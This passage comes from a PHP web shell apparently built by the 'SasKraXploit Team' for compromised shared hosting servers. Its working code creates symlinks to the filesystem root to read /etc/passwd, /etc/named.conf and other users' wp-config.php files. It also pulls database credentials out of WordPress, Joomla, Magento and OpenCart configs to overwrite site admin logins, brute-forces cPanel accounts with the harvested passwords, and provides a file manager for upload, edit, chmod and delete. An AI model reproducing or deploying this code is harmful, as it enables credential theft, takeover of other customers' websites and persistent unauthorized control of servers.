                            <td>'.$user['name']."</td>
                            <td><a href='$full/saskra_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
                        </tr>";
                    flush();
                    $dcount++;
                }
            }
        }
        echo '</table></div>';
    } else {
        $TEST = @file('/etc/passwd');
        if ($TEST) {
            @mkdir('saskra_sym', 0777);
            @chdir('saskra_sym');
            @exe('ln -s / root');
            $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
            $fp3 = fopen('.htaccess', 'w');
            $fw3 = fwrite($fp3, $file3);
            @fclose($fp3);
            echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
            <div class='tmp'>
            <table class='text-center table-responsive'>
                <thead class='bg-warning'>
                    <th>No.</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
            $dcount = 1;
            $file = fopen('/etc/passwd', 'r') or exit('Unable to open file!');
            while (!feof($file)) {
                $s = fgets($file);
                $matches = [];
                $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                $matches = str_replace('home/', '', $matches[1]);
                if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                    continue;
                }
                echo '<tr>
                        <td>'.$dcount.'</td>
                        <td>'.$matches."</td>
                        <td><a href=$full/saskra_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
                    </tr>";
                $dcount++;
            }
            fclose($file);
            echo '</table></div>';
        } else {
            $os = explode(' ', php_uname());
            if ($os[0] != 'Windows') {
                @mkdir('saskra_sym', 0777);
                @chdir('saskra_sym');
                @exe('ln -s / root');
                $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
                $fp3 = fopen('.htaccess', 'w');
                $fw3 = fwrite($fp3, $file3);
                @fclose($fp3);
                echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
            <div class='tmp'><table class='text-center table-responsive'>
                <thead class='bg-danger'>
                    <th>ID.</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
                $temp = '';
                $val1 = 0;
                $val2 = 1000;
                for (; $val1 <= $val2; $val1++) {
                    $uid = @posix_getpwuid($val1);
                    if ($uid) {
                        $temp .= implode(':', $uid)."\n";
                    }
                }
                echo '<br/>';
                $temp = trim($temp);
                $file5 = fopen('test.txt', 'w');
                fwrite($file5, $temp);
                fclose($file5);
                $dcount = 1;
                $file =
                fopen('test.txt', 'r') or exit('Unable to open file!');
                while (!feof($file)) {
                    $s = fgets($file);
                    $matches = [];
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace('home/', '', $matches[1]);
                    if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                        continue;
                    }
                    echo '<tr>
                        <td>'.$dcount.'</td>
                        <td>'.$matches."</td>
                        <td><a href=$full/saskra_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
                    </tr>";
                    $dcount++;
                }
                fclose($file);
                echo '</table></div>';
                unlink('test.txt');
            }
        }
    }
    exit;
}
function aksiSymread($dir, $file) {
    echo "read /etc/named.conf
    <form method='post' action='?dir=$dir&aksi=symread&save=1'>
    <textarea class='form-control' rows='13' name='file'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('saskra_sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
    echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<br/>save has been successfully';
        }
        fclose($f);
    }
    exit;
}
function sym404($dir, $file) {
    $cp = get_current_user();
    if ($_POST['execute']) {
        @rmdir('saskra_sym404');
        @mkdir('saskra_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        @system('ln -s '.$dir.'saskra_sym404/'.$isi);
        @symlink($dir, 'saskra_sym404/'.$isi);
        $inija = fopen('saskra_sym404/.htaccess', 'w');
        @fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
        echo'<a href="/saskra_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
    } else {
        echo '<h2>Symlink 404</h2>
        <form method="post">
            File Target: <input type="text" class="form-control" name="dir" value="/home/'.$cp.'/public_html/wp-config.php"><br/>
            Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
            <input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
            <p class="text-muted">NB: Letak wp-config tidak semuanya berada di <u>public_html/wp-config.php</u> jadi silahkan ubah sesuai letaknya.</p>
        </form>';
    }
    exit;
}
function symBypass($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $pageFTP = 'ftp://'.$_SERVER['SERVER_NAME'].'/public_html/'.$_SERVER['REQUEST_URI'];
    $u = explode('/', $pageFTP);
    $pageFTP = str_replace($u[count($u) - 1], '', $pageFTP);
    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
        $cont = stripcslashes($_POST['file']);
        if (!file_exists('passwd.txt')) {
            $f = @fopen('passwd.txt', 'w');
            $w = @fwrite($f, $cont);
            fclose($f);
        }
        if ($w or @filesize('passwd.txt') > 0) {
            echo "<div class='tmp'>
            <table width='100%' class='text-center table-responsive mb-4'>
                <thead class='bg-info'>
                    <th>Users</th>
                    <th>symlink</th>
                    <th>FTP</th>
                </thead>";
            flush();
            $fil3 = file('passwd.txt');
            foreach ($fil3 as $f) {
                $u = explode(':', $f);
                $user = $u['0'];
                echo "<tr>
                        <td class='text-left pl-1'>$user</td>
                        <td><a href='$full/sym/root/home/$user/public_html' target='_blank'>Symlink </a></td>
                        <td><a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a></td>
                    </tr>";
                flush();
                flush();
            }
            echo '</tr></table></div>';
            die();
        }
    }
    echo "read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a>
    <form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
        <textarea class='form-control' rows='13' name='file'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        for ($uid = 0; $uid < 1000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
    }
    flush();
    echo "</textarea><br/>
        <input type='submit' class='btn btn-danger btn-block' value='Symlink'/>
    </form>";
    flush();
    exit;
}
function autoeditconfig() {
    echo "<center>
    <h3>Auto Edit User Config</h3>
    <form method='post'>
    DIR Config: <br>
    <input type='text' size='50' name='config_dir' value='$dir'><br><br>
    Set User & Pass: <br>
    <input type='text' name='user_baru' value='cyberpunks' placeholder='user_baru'><br>
    <input type='text' name='pass_baru' value='cyberpunks' placeholder='pass_baru'><br>
    <input class='btn btn-outline-light' type='submit' name='hajar' value='Hajar!' style='width: 250px;'>
    </form>
    <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
    ";
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "<center>username atau password harus lebih dari 6 karakter</center>";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                        echo "</div>";
                    }
                    mysql_close($conn);
                }
            }
        }
    }
}

function cpanelcrack(){
    if($_POST['crack']) {
		$usercp = explode("
", $_POST['user_cp']);
		$passcp = explode("
", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=deepskyblue>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=deepskyblue>$ucp</font>) password (<font color=deepskyblue>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=cyan>Cyberpunks</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 300px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp
";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 300px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."
";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."
";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."
";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."
";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."
";
					} else {
						$pass .= $pass1[1]."
";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."
";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 300px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center>";
	}
}

if (isset($_POST['newFolderName'])) {
    if (mkdir($path . '/' . $_POST['newFolderName'])) {
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create File Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (rename($path. '/'. $_GET['item'], $_POST['newName'])) {
        flash("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Rename Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) {
        flash("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Edit Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Permission", "Failed", "error", "?dir=$path");
    }
}
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    if ($action == 'delete' && isset($_GET['item'])) {
        function removedir($dir) {
            if(!rmdir($dir)) {
                $file = scandir($dir);
                foreach ($file as $files) {
                    if(is_file($dir."/".$files)) {
                        if(unlink($dir."/".$files)) {
                            rmdir($dir);
                        }
                    }
                    if(is_dir($dir."/".$files)) {
                        rmdir($dir."/".$files);
                        rmdir($dir);
                    }
                }
            }
        }
        if (is_dir($_GET['item'])) {
            if (removedir($_GET['item'])) {
                flash("Delete Folder Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Delete Folder Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if (unlink($_GET['item'])) {
                flash("Delete File Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Delete File Failed", "Failed", "error", "?dir=$path");
            }
        }
    }
}

if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    for ($i = 0; $i < $total; $i++) {
        $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
    }
    if ($total < 2) {
        if ($mainupload) {
            flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
    else{
        if ($mainupload) {
            flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
        } else {
            flash("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
}

$dirs = scandir($path);

$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
    $dom = "Cant read /etc/named.conf";
    $GLOBALS["need_to_update_header"] = "true";
}else{ 
    $count = 0;
    foreach ($d0mains as $d0main){
        if (@strstr($d0main, "zone")){
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2){
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

$phpver = PHP_VERSION;
$phpos = PHP_OS;
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$uip = $_SERVER['REMOTE_ADDR'];
$serv = $_SERVER['HTTP_HOST'];
$soft = $_SERVER['SERVER_SOFTWARE'];
$x_uname = LewsEx("uname -a");
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($x_uname) > 0 ? $x_uname : 'Uname Error!');
$sql = function_exists('mysqli_connect') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $curl = function_exists('curl_init') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $wget = is_file('/usr/bin/wget') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $pl = is_file('/usr/bin/perl') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $py = is_file('/usr/bin/python') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $gcc = is_file('/usr/bin/gcc') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $pkexec = is_file('/usr/bin/pkexec') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disfc = "<gr>NONE</gr>";
            } else {
                $disfc = "<rd>$disfunc</rd>";
            }
?>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <title><?= $nm; ?> [ <?= $serv; ?> ]</title>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
        <style type="text/css">
            .msgbox {
                padding: 5px;
                background: #EEE685;
                text-align: center;
                vertical-align: middle;
                border: 1px solid #666666; 
            }
            /* Menggunakan selektor dengan kelas .box dan !important untuk memastikan keutamaan */
            .box {
                background-color: #331e52 !important; /* Warna ungu gelap yang lebih tua */
                color: white; /* Warna teks putih agar kontras */
                padding: 16px; /* Tambahkan padding agar konten tidak terlalu dekat dengan tepi */
                border-radius: 12px; /* Tambahkan sudut bulat */
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5); /* Tambahkan bayangan untuk efek tampilan */
            }
            .table-hover-gray tbody tr:hover {
                background-color: gray; /* Warna latar belakang abu-abu saat dihover */
                color: white; /* Warna teks putih */
            }
            * {
                font-family: Ubuntu Mono;
            }
            a {
                text-decoration: none;
                color: white;
            }
            a:hover {
                color: white;
            }
            /* width */
            ::-webkit-scrollbar {
                width: 7px;
                height: 7px;
            }
            /* Handle */
            ::-webkit-scrollbar-thumb {
                background: grey;
                border-radius: 7px;
            }
            /* Track */
            ::-webkit-scrollbar-track {
                box-shadow: inset 0 0 7px grey;
                border-radius: 7px;
            }
            .td-break {
                word-break: break-all
            }
            gr {color:#54A700;}
            rd {color:red;}
            .kanan {
                text-align: right;
                margin-top: -10px;
                font-size:12px;
            }
        </style>
    </head>
    <body style="background-color: rgba(0, 0, 0, 0.9); color: white;">
    <center><img src="https://d.top4top.io/p_1748iokq91.png" height='230' widht='180' alt="logo" /></center>
    <center><p> SasKraXploit Team</p></center>
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="p-4 rounded-3">
                    <table class="table table-borderless text-light">
                        <tr>
                            <td style="width: 7%;">Author</td>
                            <td style="width: 1%">:</td>
                            <td><font color="lime">SasKraXploit Team</font></td>
                        </tr>
                        <tr>
                            <td style="width: 7%;">Permission</td>
                            <td style="width: 1%">:</td>
                            <td>[&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]</td>
                        </tr>
                    </table>
                    <div class="p-2">
                        <i class="fa fa fa-folder pt-1"></i>&ensp;
                        <?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0): ?>

                            <a href="?dir=/" class="text-decoration-none text-light">/</a>
                        <?php endif; if ($pat == '') continue; ?>

                            <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) { echo "$exdir[$i]"; if ($i != $id) echo "/"; } ?>" class="text-decoration-none text-light"><?= $pat ?></a>
                            <span class="text-light"> /</span>
                        <!-- endforeach -->
                        <?php endforeach; ?>

                    </div>
                    <div class="kanan py-3" id="infoo">
                        <button class="btn btn-outline-light" data-bs-toggle="collapse" data-bs-target="#collapseinfo" aria-expanded="false" aria-controls="collapseinfo"><i class="fa fa-info-circle"></i> Info <i class="fa fa-chevron-down"></i></button>
                    </div>
                        <div class="collapse text-light mb-3" id="collapseinfo">
                            <div class="box shadow bg-transparent p-4 rounded-3">
                                System: <gr><?= $uname; ?></gr><br>
                                Software: <gr><?= $soft; ?></gr><br>
